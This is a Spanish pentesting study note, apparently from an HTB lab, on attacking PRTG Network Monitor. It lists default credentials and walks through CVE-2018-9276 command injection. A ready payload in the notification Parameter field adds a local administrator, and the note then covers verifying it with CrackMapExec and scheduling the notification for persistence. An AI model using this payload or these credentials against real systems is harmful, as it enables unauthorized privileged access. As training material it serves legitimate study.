---
tags:
  - Web/Red-Team
  - PRTG
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-16
Nota previa: "[[01 - Ataques a Splunk]]"
Nota siguiente: "[[00 - Enumeración y ataques a osTicket]]"
Area: "[[Common Applications.base|Common Applications]]"
---
---

<mark style="background: #ADCCFFA6;">PRTG Network Monitor (Paessler) es un sistema de monitorización de red *agentless*</mark>, en Delphi, con interfaz web en el **puerto 8080**. Corre como `SYSTEM` en Windows → un RCE aquí es un foothold privilegiado. Aparece sobre todo en interno (la box **Netmon** de HTB lo ilustra).

# Fingerprinting

`nmap -sV` da la firma inconfundible, y el `prtgversion` está en el HTML de login:

```shell-session
$ sudo nmap -sV -p8080 10.129.201.50
8080/tcp  open  http  Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)

$ curl -s http://10.129.201.50:8080/index.htm | grep prtgversion
... prtgmini.css?prtgversion=17.3.33.2830 ...
```

<mark style="background: #FFB86CA6;">Credenciales por defecto `prtgadmin:prtgadmin`</mark> (EyeWitness las pre-rellena; a menudo sin cambiar — en el lab, `prtgadmin:Password123`).

# CVE-2018-9276 — command injection autenticada

En PRTG < 18.2.39, <mark style="background: #FF5582A6;">el campo *Parameter* de una **Notification** se pasa directo a un script PowerShell sin sanitizar</mark>. Flujo con acceso admin:

1. **Setup → Account Settings → Notifications → Add new notification**.
2. Marcar **EXECUTE PROGRAM** → *Program File*: `Demo exe notification - outfile.ps1`.
3. En *Parameter*, inyectar el comando (aquí, crear un admin local):
   ```text
   test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
   ```
4. **Save** → **Test** (la notificación se encola y ejecuta).

Es **command injection ciega** (no hay salida). Se verifica el resultado — p. ej. confirmar el admin local con CrackMapExec:

```shell-session
$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
SMB  10.129.201.50  445  APP03  [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

Desde ahí, `evil-winrm`, `wmiexec.py`/`psexec.py` (impacket) o RDP.

> [!info]+ Detalle útil: persistencia
> La notificación se puede **programar** para ejecutarse a una hora fija cada día → mecanismo de persistencia sencillo en compromisos largos. Modernización: PRTG sigue en interno; CVE-2018-9276 se explota aún en versiones sin parchear. Herramientas: `prtg-exploit.sh`, módulos de Metasploit, `nuclei -tags prtg`. El primer test, siempre `prtgadmin:prtgadmin`.

Siguiente, un sistema de ticketing donde el ataque es de funcionalidad: [[00 - Enumeración y ataques a osTicket|osTicket]].
